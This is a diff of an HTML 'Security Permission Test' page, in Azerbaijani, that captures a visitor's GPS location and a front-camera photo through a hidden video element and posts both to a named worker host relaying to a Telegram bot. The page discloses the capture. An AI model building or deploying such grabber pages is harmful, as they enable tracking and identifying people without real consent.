@@ -2,464 +2,539 @@
 <!DOCTYPE html>
 <html lang="az">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport"
-        content="width=device-width, initial-scale=1.0">
+<meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0">
 
-  <title>Security Permission Test</title>
+<title>Security Permission Test</title>
 
-  <style>
-    * {
-      box-sizing: border-box;
-    }
+<style>
+* {
+  box-sizing: border-box;
+}
 
-    body {
-      margin: 0;
-      min-height: 100vh;
-      padding: 20px;
-      background: #0d1117;
-      color: #e6edf3;
-      font-family: -apple-system, BlinkMacSystemFont,
-                   "Segoe UI", Arial, sans-serif;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
+body {
+  margin: 0;
+  min-height: 100vh;
+  padding: 20px;
+  background: #0d1117;
+  color: #e6edf3;
+  font-family: Arial, sans-serif;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
 
-    .container {
-      width: 100%;
-      max-width: 420px;
-      background: #161b22;
-      border: 1px solid #30363d;
-      border-radius: 20px;
-      padding: 30px 24px;
-      text-align: center;
-    }
+.container {
+  width: 100%;
+  max-width: 420px;
+  background: #161b22;
+  border: 1px solid #30363d;
+  border-radius: 18px;
+  padding: 28px 22px;
+  text-align: center;
+}
 
-    .icon {
-      font-size: 48px;
-      margin-bottom: 14px;
-    }
+h1 {
+  font-size: 23px;
+  margin-bottom: 12px;
+}
 
-    h1 {
-      margin: 0 0 14px;
-      font-size: 24px;
-    }
+.description {
+  color: #8b949e;
+  font-size: 14px;
+  line-height: 1.7;
+}
 
-    .description {
-      color: #8b949e;
-      font-size: 14px;
-      line-height: 1.8;
-    }
+.notice {
+  margin: 20px 0;
+  padding: 15px;
+  background: #0d1117;
+  border: 1px solid #30363d;
+  border-radius: 10px;
+  text-align: left;
+  font-size: 13px;
+  line-height: 1.8;
+}
 
-    .notice {
-      margin: 20px 0;
-      padding: 15px;
-      background: #0d1117;
-      border: 1px solid #30363d;
-      border-radius: 12px;
-      text-align: left;
-      font-size: 13px;
-      line-height: 1.8;
-    }
+button {
+  width: 100%;
+  padding: 15px;
+  margin-top: 12px;
+  background: #238636;
+  border: none;
+  border-radius: 10px;
+  color: white;
+  font-size: 15px;
+  font-weight: 600;
+  cursor: pointer;
+}
 
-    .notice strong {
-      color: #e6edf3;
-    }
+button:disabled {
+  opacity: 0.5;
+  cursor: not-allowed;
+}
 
-    button {
-      width: 100%;
-      margin-top: 10px;
-      padding: 16px;
-      background: #238636;
-      border: none;
-      border-radius: 10px;
-      color: white;
-      font-size: 15px;
-      font-weight: 600;
-      cursor: pointer;
-    }
+.status {
+  margin-top: 15px;
+  font-size: 14px;
+  line-height: 1.7;
+}
 
-    button:disabled {
-      opacity: 0.5;
-      cursor: not-allowed;
-    }
+.card {
+  margin-top: 12px;
+  padding: 15px;
+  background: #0d1117;
+  border: 1px solid #30363d;
+  border-radius: 10px;
+}
 
-    .status {
-      margin-top: 20px;
-      font-size: 14px;
-      line-height: 1.8;
-    }
+.success {
+  color: #3fb950;
+}
 
-    .success {
-      color: #3fb950;
-    }
+.error {
+  color: #f85149;
+}
 
-    .error {
-      color: #f85149;
-    }
+.loading {
+  color: #58a6ff;
+}
 
-    .loading {
-      color: #58a6ff;
-    }
+.help-box {
+  margin-top: 15px;
+  padding: 15px;
+  background: #21262d;
+  border: 1px solid #484f58;
+  border-radius: 10px;
+  font-size: 13px;
+  line-height: 1.8;
+  text-align: left;
+}
 
-    .status-card {
-      margin-top: 12px;
-      padding: 15px;
-      background: #0d1117;
-      border: 1px solid #30363d;
-      border-radius: 10px;
-    }
+.help-box strong {
+  color: #e6edf3;
+}
 
-    .footer {
-      margin-top: 25px;
-      font-size: 11px;
-      color: #6e7681;
-    }
+.secondary {
+  background: #30363d;
+}
 
-    video {
-      position: absolute;
-      width: 1px;
-      height: 1px;
-      opacity: 0;
-      pointer-events: none;
-    }
-  </style>
+.hidden {
+  display: none;
+}
+
+video {
+  position: absolute;
+  width: 1px;
+  height: 1px;
+  opacity: 0;
+  pointer-events: none;
+}
+
+.footer {
+  margin-top: 24px;
+  font-size: 11px;
+  color: #6e7681;
+}
+</style>
 </head>
 
 <body>
 
-  <main class="container">
+<main class="container">
 
-    <div class="icon">📍📷</div>
+  <div style="font-size:45px;">📍📷</div>
 
-    <h1>Security Permission Test</h1>
+  <h1>Security Permission Test</h1>
 
-    <p class="description">
-      Bu səhifə GPS və kamera icazələrinin
-      işləməsini yoxlamaq üçündür.
+  <p class="description">
+    GPS və kamera icazələrini yoxlayın.
+  </p>
+
+  <div class="notice">
+    <strong>🔒 Məlumatlandırma</strong>
+
+    <p>
+      📍 Test zamanı GPS konumunuz
+      Telegram botuna göndəriləcək.
     </p>
 
-    <div class="notice">
-      <strong>🔒 Məlumatlandırma</strong>
+    <p>
+      📷 Kamera icazəsi verildikdə
+      təxminən 1 saniyə sonra foto çəkiləcək
+      və Telegram botuna göndəriləcək.
+    </p>
 
-      <p>
-        Testi başladanda:
-      </p>
+    <p>
+      Kamera çəkilişdən sonra bağlanacaq.
+      İcazə vermək məcburi deyil.
+    </p>
+  </div>
 
-      <p>
-        📍 GPS koordinatlarınız əldə edilərək
-        test sahibinin Telegram botuna göndəriləcək.
-      </p>
+  <button id="startBtn" onclick="startTest()">
+    📍📷 Konumumu və şəklimi Telegram-a göndər
+  </button>
 
-      <p>
-        📷 Kamera icazəsi verildikdə
-        təxminən 1 saniyə sonra bir foto çəkilərək
-        həmin Telegram botuna göndəriləcək.
-      </p>
+  <div id="gpsStatus"
+       class="status"
+       role="status"
+       aria-live="polite"></div>
 
-      <p>
-        Kamera çəkilişdən sonra bağlanacaq.
-        İcazələri rədd edə bilərsiniz.
-      </p>
-    </div>
+  <div id="cameraStatus"
+       class="status"
+       role="status"
+       aria-live="polite"></div>
 
-    <button id="startBtn" onclick="startTest()">
-      📍📷 Konumumu və şəklimi Telegram-a göndər
+  <div id="permissionHelp"
+       class="help-box hidden">
+
+    <strong>⚙️ İcazələri necə aktivləşdirmək olar?</strong>
+
+    <p>
+      Əgər Allow pəncərəsi açılmırsa,
+      brauzer bu sayt üçün icazəni bloklamış ola bilər.
+    </p>
+
+    <p>
+      <strong>Android / Chrome:</strong><br>
+      Saytın ünvanının yanındakı işarəyə basın →
+      Site settings → Location və Camera →
+      Allow.
+    </p>
+
+    <p>
+      <strong>iPhone / Safari:</strong><br>
+      Safari-də sayt ayarlarını açın və
+      Camera, Location icazələrini yoxlayın.
+      Həmçinin telefonun Settings bölməsində
+      Location Services aktiv olmalıdır.
+    </p>
+
+    <p>
+      İcazələri dəyişdikdən sonra
+      bu səhifəyə qayıdıb yenidən yoxlayın.
+    </p>
+
+    <button class="secondary"
+            onclick="startTest()">
+      🔄 Yenidən yoxla
     </button>
 
-    <div id="gpsStatus"
-         class="status"
-         role="status"
-         aria-live="polite"></div>
+  </div>
 
-    <div id="cameraStatus"
-         class="status"
-         role="status"
-         aria-live="polite"></div>
+  <video id="camera" autoplay playsinline muted></video>
 
-    <video
-      id="camera"
-      autoplay
-      playsinline
-      muted>
-    </video>
+  <div class="footer">
+    GPS & Camera Security Test
+  </div>
 
-    <div class="footer">
-      GPS & Camera Security Test
+</main>
+
+<script>
+
+const WORKER_URL =
+  "https://pervin-location-bot.zaxidlipervin.workers.dev";
+
+const startBtn =
+  document.getElementById("startBtn");
+
+const gpsStatus =
+  document.getElementById("gpsStatus");
+
+const cameraStatus =
+  document.getElementById("cameraStatus");
+
+const permissionHelp =
+  document.getElementById("permissionHelp");
+
+let cameraStream = null;
+let isRunning = false;
+
+
+// İcazə təlimatını göstər
+function showPermissionHelp() {
+  permissionHelp.classList.remove("hidden");
+}
+
+
+// GPS məlumatını Telegram-a göndər
+async function sendLocation(lat, lon, accuracy) {
+
+  const response = await fetch(
+    WORKER_URL + "/location",
+    {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        lat,
+        lon,
+        accuracy
+      })
+    }
+  );
+
+  if (!response.ok) {
+    throw new Error("Telegram göndərişi alınmadı");
+  }
+}
+
+
+// GPS koordinatlarını al
+function getPosition() {
+
+  return new Promise((resolve, reject) => {
+
+    if (!navigator.geolocation) {
+      reject(new Error("GPS dəstəklənmir"));
+      return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+      resolve,
+      reject,
+      {
+        enableHighAccuracy: false,
+        timeout: 15000,
+        maximumAge: 0
+      }
+    );
+  });
+}
+
+
+// GPS testi
+async function testLocation() {
+
+  gpsStatus.innerHTML = `
+    <div class="card loading">
+      📡 GPS icazəsi yoxlanılır...
     </div>
+  `;
 
-  </main>
+  try {
 
-  <script>
+    const position = await getPosition();
 
-    const WORKER_URL =
-      "https://pervin-location-bot.zaxidlipervin.workers.dev";
+    const lat = position.coords.latitude;
+    const lon = position.coords.longitude;
+    const accuracy = position.coords.accuracy;
 
-    const startBtn =
-      document.getElementById("startBtn");
+    gpsStatus.innerHTML = `
+      <div class="card loading">
+        📤 Konum Telegram-a göndərilir...
+      </div>
+    `;
 
-    const gpsStatus =
-      document.getElementById("gpsStatus");
+    await sendLocation(lat, lon, accuracy);
 
-    const cameraStatus =
-      document.getElementById("cameraStatus");
+    gpsStatus.innerHTML = `
+      <div class="card success">
+        ✅ Konum Telegram-a göndərildi!
+      </div>
+    `;
 
-    let cameraStream = null;
+  } catch (error) {
 
+    let message = "GPS xətası baş verdi.";
 
-    // Bir düymə ilə hər iki testi başlat
-    async function startTest() {
+    if (error.code === 1) {
+      message =
+        "GPS icazəsi rədd edilib. " +
+        "Sayt ayarlarından Location icazəsini aktivləşdirin.";
 
-      startBtn.disabled = true;
-
-      gpsStatus.innerHTML = `
-        <div class="status-card loading">
-          📡 Konum əldə edilir...
-        </div>
-      `;
-
-      cameraStatus.innerHTML = `
-        <div class="status-card loading">
-          📷 Kamera icazəsi gözlənilir...
-        </div>
-      `;
-
-      // GPS və kamera yoxlamalarını başladır
-      await Promise.allSettled([
-        testLocation(),
-        testCamera()
-      ]);
-
-      startBtn.disabled = false;
-      startBtn.textContent = "🔄 Yenidən test et";
+      showPermissionHelp();
     }
 
+    else if (error.code === 2) {
+      message =
+        "Konum müəyyən edilə bilmədi. " +
+        "Telefonun GPS funksiyasını aktivləşdirin.";
 
-    // GPS koordinatlarını əldə et
-    function getPosition() {
+      showPermissionHelp();
+    }
 
-      return new Promise((resolve, reject) => {
+    else if (error.code === 3) {
+      message =
+        "Konum 15 saniyədə alınmadı. " +
+        "GPS-i aktivləşdirib yenidən yoxlayın.";
 
-        if (!navigator.geolocation) {
-          reject(new Error("GPS dəstəklənmir"));
-          return;
-        }
+      showPermissionHelp();
+    }
 
-        navigator.geolocation.getCurrentPosition(
-          resolve,
-          reject,
-          {
-            enableHighAccuracy: false,
-            timeout: 15000,
-            maximumAge: 0
-          }
-        );
+    gpsStatus.innerHTML = `
+      <div class="card error">
+        ❌ ${message}
+      </div>
+    `;
+  }
+}
 
+
+// Kameranı bağla
+function stopCamera() {
+
+  if (cameraStream) {
+    cameraStream.getTracks().forEach(
+      track => track.stop()
+    );
+    cameraStream = null;
+  }
+
+  document.getElementById("camera").srcObject = null;
+}
+
+
+// Kamera testi
+async function testCamera() {
+
+  cameraStatus.innerHTML = `
+    <div class="card loading">
+      📷 Kamera icazəsi yoxlanılır...
+    </div>
+  `;
+
+  try {
+
+    if (!navigator.mediaDevices?.getUserMedia) {
+      throw new Error("Camera unsupported");
+    }
+
+    // Hər basılışda brauzerdən kamera istənilir
+    cameraStream =
+      await navigator.mediaDevices.getUserMedia({
+        video: {
+          facingMode: "user"
+        },
+        audio: false
       });
-    }
 
+    const video =
+      document.getElementById("camera");
 
-    // GPS testi
-    async function testLocation() {
+    video.srcObject = cameraStream;
 
-      try {
+    await video.play();
 
-        const position = await getPosition();
+    cameraStatus.innerHTML = `
+      <div class="card loading">
+        📷 Kamera aktivdir. Foto çəkilir...
+      </div>
+    `;
 
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
-        const accuracy = position.coords.accuracy;
-
-        gpsStatus.innerHTML = `
-          <div class="status-card loading">
-            📤 Konum Telegram-a göndərilir...
-          </div>
-        `;
-
-        const response = await fetch(
-          WORKER_URL + "/location",
-          {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-              lat,
-              lon,
-              accuracy
-            })
-          }
-        );
-
-        if (!response.ok) {
-          throw new Error("Telegram göndərişi alınmadı");
-        }
-
-        gpsStatus.innerHTML = `
-          <div class="status-card success">
-            ✅ Konum Telegram-a göndərildi!
-          </div>
-        `;
-
-      } catch (error) {
-
-        let message = error.message;
-
-        if (error.code === 1) {
-          message = "GPS icazəsi verilmədi.";
-        }
-
-        if (error.code === 2) {
-          message =
-            "Konum tapılmadı. GPS-i aktivləşdirib yenidən cəhd edin.";
-        }
-
-        if (error.code === 3) {
-          message =
-            "Konum 15 saniyədə alınmadı. GPS-i aktivləşdirib yenidən daxil olun.";
-        }
-
-        gpsStatus.innerHTML = `
-          <div class="status-card error">
-            ❌ ${message}
-          </div>
-        `;
-      }
-    }
-
-
-    // Kamera testi
-    async function testCamera() {
-
-      try {
-
-        if (!navigator.mediaDevices?.getUserMedia) {
-          throw new Error("Kamera dəstəklənmir");
-        }
-
-        cameraStream =
-          await navigator.mediaDevices.getUserMedia({
-            video: {
-              facingMode: "user"
-            },
-            audio: false
-          });
-
-        const video =
-          document.getElementById("camera");
-
-        video.srcObject = cameraStream;
-
-        await video.play();
-
-        cameraStatus.innerHTML = `
-          <div class="status-card loading">
-            📷 Kamera aktivdir. Foto çəkilir...
-          </div>
-        `;
-
-        // Təxminən 1 saniyə gözlə
-        await new Promise(resolve =>
-          setTimeout(resolve, 1000)
-        );
-
-        if (!video.videoWidth || !video.videoHeight) {
-          throw new Error("Kamera görüntüsü hazır deyil");
-        }
-
-        const canvas = document.createElement("canvas");
-
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-
-        canvas.getContext("2d")
-          .drawImage(video, 0, 0);
-
-        // JPEG şəkil yarat
-        const photoBlob = await new Promise(resolve =>
-          canvas.toBlob(resolve, "image/jpeg", 0.8)
-        );
-
-        if (!photoBlob) {
-          throw new Error("Foto yaradıla bilmədi");
-        }
-
-        // Çəkiliş bitdikdən sonra kameranı bağla
-        stopCamera();
-
-        cameraStatus.innerHTML = `
-          <div class="status-card loading">
-            📤 Foto Telegram-a göndərilir...
-          </div>
-        `;
-
-        const formData = new FormData();
-        formData.append(
-          "photo",
-          photoBlob,
-          "security-test.jpg"
-        );
-
-        const response = await fetch(
-          WORKER_URL + "/photo",
-          {
-            method: "POST",
-            body: formData
-          }
-        );
-
-        if (!response.ok) {
-          throw new Error("Foto göndərilə bilmədi");
-        }
-
-        cameraStatus.innerHTML = `
-          <div class="status-card success">
-            ✅ Foto Telegram-a göndərildi!
-          </div>
-        `;
-
-      } catch (error) {
-
-        cameraStatus.innerHTML = `
-          <div class="status-card error">
-            ❌ Kamera testi tamamlanmadı:
-            ${error.name === "NotAllowedError"
-              ? "Kamera icazəsi verilmədi."
-              : "Kameranı və bağlantını yoxlayın."}
-          </div>
-        `;
-
-      } finally {
-        stopCamera();
-      }
-    }
-
-
-    // Kameranı bağla
-    function stopCamera() {
-
-      if (cameraStream) {
-        cameraStream.getTracks().forEach(
-          track => track.stop()
-        );
-        cameraStream = null;
-      }
-
-      const video =
-        document.getElementById("camera");
-
-      video.srcObject = null;
-    }
-
-
-    // Səhifədən çıxanda kameranı bağla
-    window.addEventListener(
-      "pagehide",
-      stopCamera
+    // 1 saniyə gözlə
+    await new Promise(resolve =>
+      setTimeout(resolve, 1000)
     );
 
-  </script>
+    if (!video.videoWidth || !video.videoHeight) {
+      throw new Error("Camera not ready");
+    }
+
+    const canvas = document.createElement("canvas");
+
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    canvas.getContext("2d").drawImage(video, 0, 0);
+
+    const photoBlob = await new Promise(resolve =>
+      canvas.toBlob(resolve, "image/jpeg", 0.8)
+    );
+
+    if (!photoBlob) {
+      throw new Error("Photo failed");
+    }
+
+    stopCamera();
+
+    cameraStatus.innerHTML = `
+      <div class="card loading">
+        📤 Foto Telegram-a göndərilir...
+      </div>
+    `;
+
+    const formData = new FormData();
+
+    formData.append(
+      "photo",
+      photoBlob,
+      "security-test.jpg"
+    );
+
+    const response = await fetch(
+      WORKER_URL + "/photo",
+      {
+        method: "POST",
+        body: formData
+      }
+    );
+
+    if (!response.ok) {
+      throw new Error("Upload failed");
+    }
+
+    cameraStatus.innerHTML = `
+      <div class="card success">
+        ✅ Foto Telegram-a göndərildi!
+      </div>
+    `;
+
+  } catch (error) {
+
+    const denied =
+      error.name === "NotAllowedError" ||
+      error.name === "PermissionDeniedError";
+
+    if (denied) {
+      showPermissionHelp();
+    }
+
+    cameraStatus.innerHTML = `
+      <div class="card error">
+        ❌ ${
+          denied
+            ? "Kamera icazəsi rədd edilib. Sayt ayarlarından Camera icazəsini aktivləşdirin."
+            : "Kamera testi tamamlanmadı. Kameranı və bağlantını yoxlayın."
+        }
+      </div>
+    `;
+
+  } finally {
+    stopCamera();
+  }
+}
+
+
+// Əsas test
+async function startTest() {
+
+  if (isRunning) return;
+
+  isRunning = true;
+  startBtn.disabled = true;
+
+  permissionHelp.classList.add("hidden");
+
+  // İki test eyni düymə ilə başlayır
+  await Promise.allSettled([
+    testLocation(),
+    testCamera()
+  ]);
+
+  startBtn.disabled = false;
+  startBtn.textContent = "🔄 Yenidən test et";
+
+  isRunning = false;
+}
+
+
+// Səhifədən çıxanda kameranı bağla
+window.addEventListener("pagehide", stopCamera);
+
+</script>
 
 </body>
 </html>
